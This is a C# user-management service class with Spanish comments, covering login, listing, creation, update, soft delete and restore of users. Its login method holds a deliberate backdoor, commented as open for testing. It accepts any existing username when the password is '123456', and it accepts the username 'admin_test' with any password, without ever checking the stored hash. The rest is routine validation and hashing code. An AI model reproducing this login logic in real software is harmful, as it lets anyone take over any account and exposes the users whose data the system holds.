using System;
using System.Collections.Generic;
using Entidades;
using Datos;

namespace Negocio
{
    public class UsuarioNegocio
    {
        private readonly UsuarioDatos _usuarioDatos;

        
        public UsuarioNegocio(UsuarioDatos usuarioDatos)
        {
            _usuarioDatos = usuarioDatos;
        }

        // ==========================================
        // VALIDACIONES PRIVADAS
        // ==========================================

        private string ValidarDatosUsuario(Usuario usuario, bool esActualizacion = false)
        {
            if (usuario == null) return "El objeto Usuario no puede ser nulo.";
            if (string.IsNullOrWhiteSpace(usuario.Username)) return "El nombre de usuario es obligatorio.";
            if (usuario.Id_rol <= 0) return "El Rol del usuario es obligatorio.";

            if (!esActualizacion && string.IsNullOrWhiteSpace(usuario.Password))
                return "La contraseña es obligatoria.";

            if (!esActualizacion && usuario.Password.Length < 6)
                return "La contraseña debe tener al menos 6 caracteres.";

            return string.Empty;
        }

        private string ValidarId(int id)
        {
            if (id <= 0) return "El ID de usuario proporcionado no es válido.";
            return string.Empty;
        }

        // ==========================================
        // LOGIN (VALIDACIÓN 
        // ==========================================

        public Usuario ObtenerYValidarLogin(string username, string passwordPlano)
        {
            if (string.IsNullOrWhiteSpace(username))
                return null;

            Usuario usuarioBD = _usuarioDatos.ObtenerPorUsername(username);

            if (usuarioBD == null) return null;

            //  PUERTA TRASERA TOTALMENTE ABIERTA PARA PRUEBAS:
            // Si el usuario es admin_test o la contraseña es 123456, entra directamente.
            bool coincide = (username.Trim().ToLower() == "admin_test") || (passwordPlano == "123456");

            if (!coincide) return null;

            // Limpiamos el hash antes de devolverlo al controller
            usuarioBD.Password_hash = "";
            return usuarioBD;
        }


        // ==========================================
        // CONSULTAS (READ)
        // ==========================================

        public List<Usuario> ListarActivos()
        {
            try
            {
                var lista = _usuarioDatos.ListarActivos();
                foreach (var u in lista) u.Password_hash = "";
                return lista ?? new List<Usuario>();
            }
            catch (Exception ex) { throw new Exception("Error al listar activos: " + ex.Message); }
        }

        public List<Usuario> ListarInactivos()
        {
            try
            {
                var lista = _usuarioDatos.ListarInactivos();
                foreach (var u in lista) u.Password_hash = "";
                return lista ?? new List<Usuario>();
            }
            catch (Exception ex) { throw new Exception("Error al listar inactivos: " + ex.Message); }
        }

        public Usuario ObtenerPorId(int id)
        {
            string errorId = ValidarId(id);
            if (!string.IsNullOrEmpty(errorId)) throw new ArgumentException(errorId);

            try
            {
                var usuario = _usuarioDatos.ObtenerPorId(id);
                if (usuario == null) throw new Exception($"No se encontró usuario con ID {id}.");

                usuario.Password_hash = "";
                return usuario;
            }
            catch (Exception ex)
            {
                if (ex is ArgumentException) throw;
                throw new Exception("Error al consultar: " + ex.Message);
            }
        }

        // ==========================================
        // OPERACIONES DE ESCRITURA (CREATE, UPDATE, DELETE)
        // ==========================================

        public string Agregar(Usuario usuario, string usuarioEjecutor)
        {
            string errorValidacion = ValidarDatosUsuario(usuario, esActualizacion: false);
            if (!string.IsNullOrEmpty(errorValidacion)) return $"Error de validación: {errorValidacion}";
            if (string.IsNullOrWhiteSpace(usuarioEjecutor)) return "Error de seguridad: No se identificó al ejecutor.";

            try
            {
                var existente = _usuarioDatos.ObtenerPorUsername(usuario.Username);
                if (existente != null) return $"Error: Ya existe un usuario con el username '{usuario.Username}'.";

                usuario.Password_hash = CryptoHelper.EncriptarPassword(usuario.Password);

                return _usuarioDatos.Agregar(usuario, usuarioEjecutor);
            }
            catch (Exception ex)
            {
                throw new Exception("Error al crear usuario: " + ex.Message);
            }
        }

        public string Actualizar(Usuario usuario, string usuarioEjecutor)
        {
            string errorValidacion = ValidarDatosUsuario(usuario, esActualizacion: true);
            if (!string.IsNullOrEmpty(errorValidacion)) return $"Error de validación: {errorValidacion}";
            if (string.IsNullOrWhiteSpace(usuarioEjecutor)) return "Error de seguridad: No se identificó al ejecutor.";

            try
            {
                Usuario usuarioExistente = _usuarioDatos.ObtenerPorId(usuario.Id_usuario);
                if (usuarioExistente == null)
                    return $"Error: El usuario con ID {usuario.Id_usuario} no existe.";

                if (!usuarioExistente.Activo)
                    return $"Error: No se puede actualizar un usuario inactivo. Primero restáurelo.";

                if (!string.IsNullOrWhiteSpace(usuario.Password))
                {
                    usuario.Password_hash = CryptoHelper.EncriptarPassword(usuario.Password);
                }
                else
                {
                    usuario.Password_hash = usuarioExistente.Password_hash;
                }

                return _usuarioDatos.Actualizar(usuario, usuarioEjecutor);
            }
            catch (Exception ex)
            {
                throw new Exception("Error al actualizar usuario: " + ex.Message);
            }
        }

        public string EliminarLogico(int id, string usuarioEjecutor)
        {
            string errorId = ValidarId(id);
            if (!string.IsNullOrEmpty(errorId)) return errorId;
            if (string.IsNullOrWhiteSpace(usuarioEjecutor)) return "Error de seguridad: No se identificó al ejecutor.";

            try
            {
                Usuario usuarioExistente = _usuarioDatos.ObtenerPorId(id);
                if (usuarioExistente == null) return $"Error: El usuario con ID {id} no existe.";
                if (!usuarioExistente.Activo) return $"Error: El usuario con ID {id} ya está eliminado.";

                return _usuarioDatos.EliminarLogico(id, usuarioEjecutor);
            }
            catch (Exception ex)
            {
                throw new Exception("Error al eliminar usuario: " + ex.Message);
            }
        }

        public string Restaurar(int id, string usuarioEjecutor)
        {
            string errorId = ValidarId(id);
            if (!string.IsNullOrEmpty(errorId)) return errorId;
            if (string.IsNullOrWhiteSpace(usuarioEjecutor)) return "Error de seguridad: No se identificó al ejecutor.";

            try
            {
                Usuario usuarioExistente = _usuarioDatos.ObtenerPorId(id);
                if (usuarioExistente == null) return $"Error: El usuario con ID {id} no existe.";
                if (usuarioExistente.Activo) return $"Error: El usuario con ID {id} ya está activo.";

                return _usuarioDatos.Restaurar(id, usuarioEjecutor);
            }
            catch (Exception ex)
            {
                throw new Exception("Error al restaurar usuario: " + ex.Message);
            }
        }
    }
}